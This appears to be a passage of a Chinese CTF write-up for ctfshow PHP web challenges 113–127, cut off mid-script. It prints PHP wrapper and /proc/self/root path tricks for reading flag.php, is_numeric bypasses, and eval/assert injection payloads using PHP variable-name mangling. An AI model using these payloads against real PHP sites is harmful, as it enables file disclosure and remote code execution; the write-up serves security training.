class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以使用伪协议：file=php://filter/read/resource=flag.php</p><p>compress.zlib://flag.php</p><p>还可以使用其他未过滤的编码：</p><p>file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</p><p>file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</p><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次把过滤器过滤了，所以我们可以使用compress.zlib://flag.php</p><p>预期解为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">=</span><span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"师傅们居然tql都是非预期 哼！"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以发现filter没有被过滤，直接用web112的即可。</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里牵扯到的是trim以及is_numeric的绕过，我们可以写个php脚本检测一下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现除了.以及+-数字，只有%0c</p><p>我们在遇到一些过滤没有思路的时候，可以写一下脚本检验一下。</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">*</span><span class="token operator">/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里，有个问题那就是在php中.不能在变量名中，当我们post上传时.会被转换为_。但是php还有一个特性，那就是他只会转换一次。所以我们可以传为，CTF[SHOW.COM=1</p><p>这样它的变量名变为CTF_SHOW.COM</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>这里主要有三种解法。首先，我们需要知道以下的知识点。</p><blockquote><p>1、cli模式（命令行）下第一个参数$_SERVER[‘argv’][0]是脚本名，其余的是传递给脚本的参数</p></blockquote><pre><code>    2、web网页模式下    在web页模式下必须在php.ini开启register_argc_argv配置项                设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]    $argv,$argc在web模式下不适用</code></pre><p>那么 $_SERVER[‘QUERY_STRING’]是什么呢？它获取的是?之后的内容比如/test.php?HELLO 那么它的值变为HELLO</p><p>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]也就是$a[0]= $_SERVER[‘QUERY_STRING’]<br>这时候我们只要通过 eval(“$c”.”;”);将$flag赋值flag_give_me就可以了。</p><p>所以，接下来我们构造payload为。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>               <span class="token comment">// 第一层为解析变量，第二层为传递。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>。。。我们可以直接输出flag啊</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">// 直接输出变量值</span>                                                                        <span class="token comment">// $global.include_file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>少过滤了$</p><p>我们可以用highlight_file($GET[1])来输出flag.php</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以继续使用Web123的payload。但是，发现eval貌似被禁用了，我们替换成assert即可。</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$url = $_SERVER[‘QUERY_STRING’];这个全局变量我们已经讲过了。extract($_GET);本函数用来将变量从数组中导入到当前的符号表中。我们举个例子，file=1也就成了，$file=1；也就说，我们这里与$_SERVER[‘QUERY_STRING’]是有关联的。而我们获得payload的方式便是使ctf_show=ilove36d。但是这里的_被过滤了，所以我们需要测试一下什么符号可以替代_。</p><p>我们这里使用一下羽师傅的脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$url</span><span class="token operator">=</span><span class="token string double-quoted-string">"http://127.0.0.1/flag.php?ctf"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"show=1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span 